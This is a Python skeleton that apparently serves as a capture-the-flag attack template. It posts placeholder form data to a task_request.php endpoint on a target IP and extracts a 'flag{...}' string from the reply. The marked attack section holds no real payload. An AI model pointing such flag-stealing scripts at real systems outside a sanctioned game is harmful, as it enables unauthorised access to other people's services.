import requests
import re
import sys


def main(ip):
    try:
        ######################################
        ###here is you attack script start####
        ######################################
        attack_address = f"http://{ip}:8888/task_request.php"
        formdata = {"task_id":"123","task_content":"123456"}
        headers={ "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
        cookies = {"cookie_name": "cookie_value", }
        response = requests.post(attack_address, data = formdata, headers = headers, cookies=cookies, verify = False, timeout=3)


        # get the flag from response by regular expression
        flag_regex =  r"\b" + "flag{" +".*\\" + "}"
        result = re.search(flag_regex, response.text)
        flag = str(result.group())
        ######################################
        ### here is you attack script end ####
        ######################################


        if flag:
            return {'getflag_status': "getflag success", 'flag': flag}
        else:
            return {'getflag_status': "getflag failed", 'flag': 'error'}
    except Exception as e:
        return {'getflag_status': "getflag failed:" + str(e), 'flag': 'error'}


if __name__ == '__main__':
    ip = sys.argv[1]
    print(main(ip))
